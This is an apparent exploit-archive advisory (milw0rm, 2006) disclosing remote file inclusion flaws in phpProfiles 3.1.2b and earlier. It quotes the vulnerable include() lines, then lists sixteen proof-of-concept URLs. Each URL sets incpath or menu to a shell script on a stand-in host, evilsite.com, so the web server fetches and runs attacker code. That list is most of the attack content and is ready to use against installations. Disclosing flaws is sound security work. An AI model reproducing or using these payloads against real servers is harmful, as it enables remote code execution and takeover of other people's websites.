<html><head><title>phpProfiles <= 3.1.2b Multiple Remote File Include Vulnerabilities</title></head><pre>+-------------------------------------------------------------------------------------------
+ phpProfiles &lt;= 3.1.2b Multiple Remote File Include Vulnerabilities
+-------------------------------------------------------------------------------------------
+ Affected Software .: phpProfiles &lt;= 3.1.2b
+ Download ..........: http://downloads.sourceforge.net/phpprofiles/phpProfiles_3_1_2.zip
+ Description .......: &quot;phpProfiles allows you to offer visitors their very own URL on your web site simply by registering&quot;
+ Class .............: Remote File Inclusion
+ Risk ..............: High (Remote File Execution)
+ Found By ..........: nuffsaid &lt;nuffsaid[at]newbslove.us&gt;
+-------------------------------------------------------------------------------------------
+ Details:
+ phpProfiles has several scripts which do not initialize variables before using them to
+ include files, assuming register_globals = on, we can initialize any one of the variables
+ in a query string and include a remote file of our choice.
+
+ Vulnerable Code:
+ include/remove_pic.inc.php line(s) 11: include(&quot;$scriptpath/redirect.php&quot;);
+ include/body_admin.inc.php line(s) 03: &lt;p&gt;&lt;?include(&quot;$menu&quot;);?&gt;&lt;/p&gt;
+ include/account.inc.php,   line(s) 09: include(&quot;$incpath/footer.inc.php&quot;);
+ include/index.inc.php,     line(s) 05: include(&quot;$incpath/adminerr.inc.php&quot;);
+ ... see below for a list of files affected.
+ 
+ Proof Of Concept:
+ http://[target]/[path]/include/body.inc.php?menu=http://evilsite.com/shell.php
+ http://[target]/[path]/include/index.inc.php?incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/account.inc.php?action=update&amp;incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/admin_newcomm.inc.php?action=create&amp;incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/header_admin.inc.php?incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/header.inc.php?incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/friends.inc.php?action=invite&amp;incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/menu_u.inc.php?incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/notify.inc.php?action=sendit&amp;incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/body.inc.php?incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/body_admin.inc.php?menu=http://evilsite.com/shell.php
+ http://[target]/[path]/include/body_admin.inc.php?incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/commrecc.inc.php?action=recommend&amp;incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/do_reg.inc.php?incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/comm_post.inc.php?action=post&amp;incpath=http://evilsite.com/shell.php?
+ http://[target]/[path]/include/menu_v.inc.php?incpath=http://evilsite.com/shell.php?
+-------------------------------------------------------------------------------------------

# milw0rm.com [2006-12-19]</pre></html>